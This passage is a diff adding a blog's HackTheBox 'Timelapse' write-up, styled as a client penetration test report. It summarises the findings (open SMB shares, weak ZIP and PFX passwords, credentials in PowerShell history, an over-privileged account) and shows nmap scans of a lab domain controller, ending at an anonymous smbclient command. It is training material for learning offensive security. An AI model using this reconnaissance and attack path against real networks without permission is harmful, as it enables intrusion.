@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <!-- 
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+                -->
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div class="title-container">
+                    <img src="../images/icons/htb_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">Timelapse</h2>
+                </div>
+                
+                <img src="../images/Posts/Timelapse/Timelapse.png" alt="" class="right-machineimage"  style="margin-top: 20px;">
+
+                <ul class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Statement-of-Confidentiality" class="sidebar-link">1. Statement of Confidentiality</a></li>
+                    <li><a href="#Introduction" class="sidebar-link">2. Introduction</a></li>
+                    <li><a href="#Executive-Summary" class="sidebar-link">3. Executive Summary</a></li>
+                    <ul>
+                        <li><a href="#Approach" class="sidebar-link">3.1 Approach</a></li>
+                        <li><a href="#Scope" class="sidebar-link">3.2 Scope</a></li>
+                        <li><a href="#Risk-Rating-Matrix" class="sidebar-link">3.3 Risk Rating Matrix</a></li>
+                        <li><a href="#Assessment-Overview-and-Recommendations" class="sidebar-link">3.4 Assessment Overview and Recommendations</a></li>
+                    </ul>
+                    <li><a href="#Netwok-Penetration-Test-Assesment-Summary" class="sidebar-link">4. Netwok Penetration Test Assesment Summary</a></li>
+                    <li><a href="#Methodologies" class="sidebar-link">5. Methodologies</a></li>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">6. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration" class="sidebar-link">6.1 Enumeration</a></li>
+                        <li><a href="#Foothold" class="sidebar-link">6.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation" class="sidebar-link">6.3 Privilege Escalation</a></li>
+                    </ul>
+                    <li><a href="#Remmediation-Summary" class="sidebar-link">7. Remmediation Summary</a></li>
+                    <ul>
+                        <li><a href="#Short-Term" class="sidebar-link">7.1 Short Term</a></li>
+                        <li><a href="#Medium-Term" class="sidebar-link">7.2 Medium Term</a></li>
+                        <li><a href="#Long-Term" class="sidebar-link">7.3 Long Term</a></li>
+                    </ul>
+                    <li><a href="#Technical-Findings-Details" class="sidebar-link">8. Technical Findings Details</a></li>
+                    <li><a href="#Conclusion" class="sidebar-link">9. Conclusion</a></li>
+                    <li><a href="#Appendices" class="sidebar-link">10. Appendices</a></li>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Timelapse WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Timelapse/Timelapse_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h2>Table of Contents</h2>
+                        <ul>
+                            <li><a href="#Statement-of-Confidentiality" class="sidebar-link">1. Statement of Confidentiality</a></li>
+                            <li><a href="#Introduction" class="sidebar-link">2. Introduction</a></li>
+                            <li><a href="#Executive-Summary" class="sidebar-link">3. Executive Summary</a></li>
+                            <ul>
+                                <li><a href="#Approach" class="sidebar-link">3.1 Approach</a></li>
+                                <li><a href="#Scope" class="sidebar-link">3.2 Scope</a></li>
+                                <li><a href="#Risk-Rating-Matrix" class="sidebar-link">3.3 Risk Rating Matrix</a></li>
+                                <li><a href="#Assessment-Overview-and-Recommendations" class="sidebar-link">3.4 Assessment Overview and Recommendations</a></li>
+                            </ul>
+                            <li><a href="#Netwok-Penetration-Test-Assesment-Summary" class="sidebar-link">4. Netwok Penetration Test Assesment Summary</a></li>
+                            <li><a href="#Methodologies" class="sidebar-link">5. Methodologies</a></li>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">6. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration" class="sidebar-link">6.1 Enumeration</a></li>
+                                <li><a href="#Foothold" class="sidebar-link">6.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation" class="sidebar-link">6.3 Privilege Escalation</a></li>
+                            </ul>
+                            <li><a href="#Remmediation-Summary" class="sidebar-link">7. Remmediation Summary</a></li>
+                            <ul>
+                                <li><a href="#Short-Term" class="sidebar-link">7.1 Short Term</a></li>
+                                <li><a href="#Medium-Term" class="sidebar-link">7.2 Medium Term</a></li>
+                                <li><a href="#Long-Term" class="sidebar-link">7.3 Long Term</a></li>
+                            </ul>
+                            <li><a href="#Technical-Findings-Details" class="sidebar-link">8. Technical Findings Details</a></li>
+                            <li><a href="#Conclusion" class="sidebar-link">9. Conclusion</a></li>
+                            <li><a href="#Appendices" class="sidebar-link">10. Appendices</a></li>
+                        </ul>
+                    </div>
+
+                    <section id="Statement-of-Confidentiality">
+                        <h1>1. Statement of Confidentiality</h1>
+                        <p>The information contained in this document is confidential and exclusive to Timelapse. This report must not be used, duplicated or disclosed to third parties without the express consent of Timelapse. Any violation of this confidentiality may have legal consequences.</p>
+                    </section>
+                    
+                    <section id="Introduction">
+                        <h1>2. Introduction</h1>
+                        <p>The security assessment presented in this report was commissioned by <strong>Timelapse</strong>, with the aim of identifying vulnerabilities in its technological infrastructure and assessing the associated risks. The purpose of this test is to strengthen the security posture of the assessed systems by identifying and remediating weaknesses that can be exploited by an attacker.</p>
+                        <p>The analysis was conducted following an ethical and professional approach, simulating techniques and tactics used by malicious actors. The results obtained reflect a reproducible and meticulous assessment, highlighting critical points that require priority attention to ensure the confidentiality, integrity and availability of <strong>Timelapse</strong> digital assets.</p>
+                        <p>This assessment included a detailed analysis of the target called <strong>Timelapse</strong>, accessible via a VPN connection provided by the company. No initial authenticated access or additional information about the environment was provided, and a <strong>black-box</strong> approach was adopted to simulate a realistic external attack.</p>
+                    </section>
+
+                    <section id="Executive-Summary">
+                        <h1>3. Executive Summary</h1>
+                        <p><strong>Timelapse</strong> hired us to perform a security assessment and penetration testing on their internal network, with the aim of identifying vulnerabilities, assessing their impact, and validating the security mechanisms implemented. This report presents the significant findings in a clear and reproducible manner, along with detailed recommendations for remediation.</p>
+                    </section>
+                    
+                    <section id="Approach">
+                        <h2>3.1 Approach</h2>
+                        <p>The assessment was conducted using a "<strong>black-box</strong>" approach between <strong>12/21/2024</strong> and <strong>12/22/2024</strong>, without any credentials or prior knowledge of <strong>Timelapse</strong>'s internal environment. The primary purpose was to identify potential unknown vulnerabilities.</p>
+                        <p>Testing was performed in a non-intrusive manner, using tools such as <strong>Nmap</strong> for enumeration, <strong>smbclient</strong> for shared folders, <strong>JohnTheRipper</strong> for password cracking, <strong>Evil-WinRM</strong> to establish a remote shell on Windows system, <strong>OpenSSL</strong> to manipulate and extract data from PFX files and <strong>PowerShell</strong> to interact with <strong>Active Directory</strong> and list configurations. Misconfigurations and security weaknesses were searched for. The process was performed remotely from a host dedicated exclusively to this assessment. Each identified vulnerability was documented and examined manually to assess its exploitation potential and escalation possibilities. Findings were validated with reproducible testing.</p>
+                    </section>
+                    
+                    <section id="Scope">
+                        <h2>3.2 Scope:</h2>
+                        <p>The evaluation focuses on the Timelapse host only.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Host/URL/IP Adress</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>10.129.227.113</td>
+                                    <td>timelapse.htb</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 1: Scope Details</p>
+                    </section>
+ 
+                    <section id="Risk-Rating-Matrix">
+                        <h2>3.3 Risk Rating Matrix</h2>
+                        <p>The table below gives a key to the risk naming and colours used throughout this report to provide a clear and concise risk scoring system.</p>
+                        <p>It should be noted that quantifying the overall business risk posed by any of the issues found in any test is outside our scope. This means that some risks may be reported as high from a technical perspective but may, as a result of other controls unknown to us, be considered acceptable by the business.</p>
+                        <table id="Appendices-table">
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Risk Rating</th>
+                                    <th>CVSSv3 Score</th>
+                                    <th style="text-align: left;">Definition</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f1">1</td>
+                                    <td id="c2-f1">Critical</td>
+                                    <td id="c3-f1">9.0 - 10</td>
+                                    <td id="c4-f1">A vulnerability was discovered that has been rated as critical. This requires resolution as quickly as possible</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f2">2</td>
+                                    <td id="c2-f2">High</td>
+                                    <td id="c3-f2">7.0 - 8.9</td>
+                                    <td id="c4-f2">A vulnerability was discovered that has been rated as high. This requires resolution in a short term.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f3">3</td>
+                                    <td id="c2-f3">Medium</td>
+                                    <td id="c3-f3">4.0 -6.9</td>
+                                    <td id="c4-f3">A vulnerability was discovered that has been rated as medium. This should be resolved throughout the ongoing maintenance process</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f4">4</td>
+                                    <td id="c2-f4">low</td>
+                                    <td id="c3-f4">1.0 - 3.9</td>
+                                    <td id="c4-f4">A vulnerability was discovered that has been rated as low. This should be addressed as part of routine maintenance tasks.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f5">5</td>
+                                    <td id="c2-f5">Info</td>
+                                    <td id="c3-f5">0 - 0.9</td>
+                                    <td id="c4-f5">A discovery was made that is reported for information. This should be addressed in order to meet leading practice.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 2: Risk Rating Matrix</p>  
+                    </section>
+
+                    <section id="Assessment-Overview-and-Recommendations">
+                        <h2>3.4 Assessment Overview and Recommendations:</h2>
+                        <p>During the penetration test performed against <strong>Timelapse</strong>, four critical vulnerabilities were identified that impact the <strong>confidentiality</strong>, <strong>integrity</strong>, and <strong>availability</strong> of the systems. The most relevant findings are summarized below:</p>
+                        <ul>
+                            <li><strong>Weak authentication on SMB shares - <span style="color: rgb(172, 0, 0);">Critical</span></strong>: Shared folders on the network allow unauthenticated access. This could allow an attacker to gain unauthorized access to sensitive information. It is recommended to restrict SMB access to authenticated users only and perform a thorough analysis of access permissions.</li>
+                            <li><strong>Excessive privileges for user `svc_deploy` - <span style="color: red;">High</span></strong>: This user has higher permissions than necessary, which could facilitate privilege escalation. It is suggested that you review and restrict this user's permissions and perform an audit of network roles and permissions.</li>
+                            <li><strong>Easily crackable passwords in compressed files - <span style="color: red;">High</span></strong>: ZIP files protected with weak passwords were found containing sensitive credentials. A stronger password policy should be implemented and these files should be properly encrypted.</li>
+                            <li><strong>Passwords stored in PowerShell history - <span style="color: orange;">Medium</span></strong>: PowerShell command history was found to store passwords in clear text, which could be exploited to gain unauthorized access. It is recommended that you disable storing sensitive commands in history and configure PowerShell to not save sensitive information.</li>
+                        </ul>
+                        <p><strong>General Impact</strong>: Exploitation of these vulnerabilities could allow an attacker to gain full system access, compromise sensitive data, and escalate privileges, potentially resulting in a significant security breach.</p>
+                        <p><strong>Timelapse</strong> is recommended to implement a series of corrective measures, starting with the highest risk ones. It is crucial to strengthen authentication and access controls, as well as review security configurations at the service and user level to mitigate potential exploits.</p>
+                    </section>
+
+                    <section id="Netwok-Penetration-Test-Assesment-Summary">
+                        <h1>4. Netwok Penetration Test Assesment Summary</h1>
+                        <p>All testing activities started from the perspective of an unauthenticated user on the network. <strong>Timelapse</strong> provided access to the network using a dedicated VPN, with no prior information about configurations or operating systems.</p>
+                    </section>
+                    
+                    <section id="Summary-of-Findings">
+                        <h2>Summary of Findings</h2>
+                        <p>During the course of testing, a total of four (<strong>4</strong>) findings were discovered that pose a material risk to <strong>Timelapse</strong>'s systems. The following table provides a summary of the findings by severity level.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th colspan="4">Finding Severity</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-level">
+                                    <td>Critical</td>
+                                    <td>High</td>
+                                    <td>Medium</td>
+                                    <td>Total</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-level-num">
+                                    <td id="darkRed">1</td>
+                                    <td id="red">2</td>
+                                    <td id="orange">1</td>
+                                    <td>4</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 3: Severity Summary</p>
+                        <p>Below is an overview of each finding identified during testing. These findings are discussed in depth in the <a href="#Technical-Findings-Details">Technical Findings Details</a> section of this report.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Finding #</th>
+                                    <th>Severity Level</th>
+                                    <th style="text-align: left;">Finding Name</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>1.</td>
+                                    <td id="darkRed">Critical</td>
+                                    <td style="text-align: left;">Weak authentication enforcement on SMB shares</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>2.</td>
+                                    <td id="red">High</td>
+                                    <td style="text-align: left;">Excessive privileges assigned to user (`<strong>svc_deploy</strong>`)</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>3.</td>
+                                    <td id="red">High</td>
+                                    <td style="text-align: left;">Insufficiently Protected Credentials (ZIP file password exposed)</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>4.</td>
+                                    <td id="orange">Medium</td>
+                                    <td style="text-align: left;">Sensitive data exposed in PowerShell command history</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 4: Finding List</p>
+                    </section>
+
+                    <section id="Summary-of-Impact">
+                        <h2>Summary of Impact</h2>
+                        <p>The identified findings represent a significant risk to the organization:</p>
+                        <div class="info-box">
+                            <ul>
+                                <li><strong>Confidentiality</strong>: Unauthorized access to sensitive information and administrative credentials.</li>
+                                <li><strong>Integrity</strong>: Potential unauthorized modifications to system configurations.</li>
+                                <li><strong>Availability</strong>: Exploits that could compromise the stability of critical services.</li>
+                            </ul>
+                        </div>
+                        <p>Exploitation of these vulnerabilities could allow a remote attacker to gain full access to the affected system, compromise sensitive information, and extend the attack to other network segments.</p>
+                    </section>
+
+                    <section id="Methodologies">
+                        <h1>5. Methodologies</h1>
+                        <p>The security assessment followed well-established and widely recognized methodologies in the cybersecurity industry. These methodologies ensured a systematic, reproducible approach, aligned with professional penetration testing standards.</p>
+                        <h2>Phases of Pentesting</h2>
+                        <ul style="list-style-type: decimal;">
+                            <li><strong>Reconnaissance</strong>: Collected public information and scanned target systems to identify exposed services and potential attack vectors.</li>
+                            <li><strong>Vulnerability Analysis</strong>: Detected misconfigurations, weak services, and other points of entry.</li>
+                            <li><strong>Exploitation</strong>: Tested identified vulnerabilities to gain unauthorized access and validate their impact.</li>
+                            <li><strong>Privilege Escalation</strong>: Investigated the environment to elevate privileges and evaluate potential risks at an administrative level.</li>
+                            <li><strong>Post-Exploitation and Remediation</strong>: Assessed the overall impact, extracted relevant information, and outlined mitigation strategies.</li>
+                        </ul>
+                        <h2>Standards and Tools</h2>
+                        <p><strong>References</strong>: OWASP Top 10, MITRE ATT&CK Framework, CWE (Common Weakness Enumeration).</p>
+                        <p><strong>Tools used</strong>: Nmap, smbclient JohnTheRipper, openssl, Evil-winrm y Powershell.</p>
+                    </section>
+
+                    <section id="Internal-Network-Compromise-Walkthrough">
+                        <h1>6. Internal Network Compromise Walkthrough</h1>
+                        <p>This section will detail a full walkthrough of the machine exploitation process, broken down step-by-step. We will begin with the enumeration phase, which will scan for open ports, available services, and potential vulnerabilities in the system, including reviewing the web application if applicable. Next, we will delve deeper into active services and their configurations, and then move on to exploiting any identified vulnerabilities. Finally, we will cover privilege escalation, describing the techniques and tools used to gain access to the system as the highest-level user, thereby achieving full control of the machine.</p>
+                    </section>
+                    
+                    <section id="Enumeration">
+                        <h2>6.1 Enumeration</h2>
+                        <h3>Nmap</h3>
+                        <p>Starting with nmap scanning.</p>
+                        <div class="console-code">
+                            <pre>
+$ nmap -n -v -Pn -p- 10.129.227.113         
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 06:27 EST
+Initiating SYN Stealth Scan at 06:27
+Scanning 10.129.227.113 [65535 ports]
+Discovered open port 53/tcp on 10.129.227.113
+Discovered open port 135/tcp on 10.129.227.113
+Discovered open port 445/tcp on 10.129.227.113
+Discovered open port 139/tcp on 10.129.227.113
+SYN Stealth Scan Timing: About 14.03% done; ETC: 06:31 (0:03:10 remaining)
+Discovered open port 636/tcp on 10.129.227.113
+Discovered open port 49673/tcp on 10.129.227.113
+Discovered open port 464/tcp on 10.129.227.113
+Discovered open port 9389/tcp on 10.129.227.113
+SYN Stealth Scan Timing: About 29.63% done; ETC: 06:31 (0:02:25 remaining)
+Discovered open port 3268/tcp on 10.129.227.113
+Discovered open port 49693/tcp on 10.129.227.113
+SYN Stealth Scan Timing: About 46.72% done; ETC: 06:31 (0:01:44 remaining)
+Discovered open port 3269/tcp on 10.129.227.113
+SYN Stealth Scan Timing: About 65.55% done; ETC: 06:30 (0:01:04 remaining)
+Discovered open port 88/tcp on 10.129.227.113
+Discovered open port 5986/tcp on 10.129.227.113
+SYN Stealth Scan Timing: About 80.71% done; ETC: 06:30 (0:00:37 remaining)
+Discovered open port 593/tcp on 10.129.227.113
+Discovered open port 49674/tcp on 10.129.227.113
+Discovered open port 389/tcp on 10.129.227.113
+Discovered open port 49667/tcp on 10.129.227.113
+Completed SYN Stealth Scan at 06:30, 182.58s elapsed (65535 total ports)
+Nmap scan report for 10.129.227.113
+Host is up (0.036s latency).
+Not shown: 65518 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49693/tcp open  unknown
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 182.64 seconds
+           Raw packets sent: 131170 (5.771MB) | Rcvd: 132 (5.808KB)                               
+                            </pre>
+                        </div>
+                        <p>Interesting open ports:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>53/tcp</td>
+                                    <td>Domain</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>88/tcp</td>
+                                    <td>kerberos-sec</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>135/tcp</td>
+                                    <td>msrpc</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>139/tcp</td>
+                                    <td>netbios-ssn</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>389/tcp</td>
+                                    <td>ldap</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>445/tcp</td>
+                                    <td>microsoft-ds</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>464/tcp</td>
+                                    <td>kpasswd5</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>593/tcp</td>
+                                    <td>http-rpc-epmap</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>636/tcp</td>
+                                    <td>ldapssl</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>3268/tcp</td>
+                                    <td>globalcatLDAP</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>9389/tcp</td>
+                                    <td>adws</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p>We proceed to enumerate service versions and run NSE scripts to find services with incorrect configurations or any vulnerabilities associated with them.</p>
+                        <div class="console-code">
+                            <pre>
+$ nmap -n -v -sCV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693 10.129.227.113 -oN scan.txt
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 06:45 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:45
+Completed NSE at 06:45, 0.00s elapsed
+Initiating NSE at 06:45
+Completed NSE at 06:45, 0.00s elapsed
+Initiating NSE at 06:45
+Completed NSE at 06:45, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:45
+Scanning 10.129.227.113 [17 ports]
+Discovered open port 389/tcp on 10.129.227.113
+Discovered open port 445/tcp on 10.129.227.113
+Discovered open port 9389/tcp on 10.129.227.113
+Discovered open port 135/tcp on 10.129.227.113
+Discovered open port 49674/tcp on 10.129.227.113
+Discovered open port 49667/tcp on 10.129.227.113
+Discovered open port 53/tcp on 10.129.227.113
+Discovered open port 5986/tcp on 10.129.227.113
+Discovered open port 139/tcp on 10.129.227.113
+Discovered open port 464/tcp on 10.129.227.113
+Discovered open port 49673/tcp on 10.129.227.113
+Discovered open port 49693/tcp on 10.129.227.113
+Discovered open port 3268/tcp on 10.129.227.113
+Discovered open port 593/tcp on 10.129.227.113
+Discovered open port 636/tcp on 10.129.227.113
+Discovered open port 3269/tcp on 10.129.227.113
+Discovered open port 88/tcp on 10.129.227.113
+Completed SYN Stealth Scan at 06:45, 0.10s elapsed (17 total ports)
+Initiating Service scan at 06:45
+Scanning 17 services on 10.129.227.113
+Completed Service scan at 06:46, 54.50s elapsed (17 services on 1 host)
+NSE: Script scanning 10.129.227.113.
+Initiating NSE at 06:46
+Completed NSE at 06:47, 40.07s elapsed
+Initiating NSE at 06:47
+Completed NSE at 06:47, 1.78s elapsed
+Initiating NSE at 06:47
+Completed NSE at 06:47, 0.00s elapsed
+Nmap scan report for 10.129.227.113
+Host is up (0.037s latency).
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-12-22 19:44:42Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2024-12-22T19:46:08+00:00; +7h59m06s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Issuer: commonName=dc01.timelapse.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-25T14:05:29
+| Not valid after:  2022-10-25T14:25:29
+| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
+|_SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49693/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m06s, deviation: 1s, median: 7h59m05s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-12-22T19:45:31
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 06:47
+Completed NSE at 06:47, 0.00s elapsed
+Initiating NSE at 06:47
+Completed NSE at 06:47, 0.00s elapsed
+Initiating NSE at 06:47
+Completed NSE at 06:47, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.75 seconds
+           Raw packets sent: 17 (748B) | Rcvd: 17 (748B)
+                            </pre>
+                        </div>
+                        <p>From the scan performed with nmap we found:</p>
+                        <table style="width: 500px;">
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Version</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>53</td>
+                                    <td>domain</td>
+                                    <td>Simple DNS Plus</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>88</td>
+                                    <td>kerberos-sec</td>
+                                    <td>Microsoft Windows Kerberos</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>135</td>
+                                    <td>msrpc</td>
+                                    <td>Microsoft Windows RPC</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>139</td>
+                                    <td>netbios-ssn</td>
+                                    <td>Microsoft Windows netbios-ssn</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>389</td>
+                                    <td>ldap</td>
+                                    <td>Microsoft Windows Active Directory LDAP</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>445</td>
+                                    <td>microsoft-ds?</td>
+                                    <td>?</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>464</td>
+                                    <td>msrpc</td>
+                                    <td>Microsoft Windows RPC</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>593</td>
+                                    <td>msrpc</td>
+                                    <td>Microsoft Windows RPC</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>636</td>
+                                    <td>ldapssl?</td>
+                                    <td>?</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>3268</td>
+                                    <td>globalcatLDAPssl?</td>
+                                    <td>?</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>9389</td>
+                                    <td>mc-nmf</td>
+                                    <td>.NET Message Framing</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>SMB</h3>
+                        <p>We list the <strong>SMB</strong> service, we find the shared folder <i>Shares</i>.</p>
+                        <div class="console-code">
+                            <pre>
+$ smbclient -L 10.129.227.113 -N
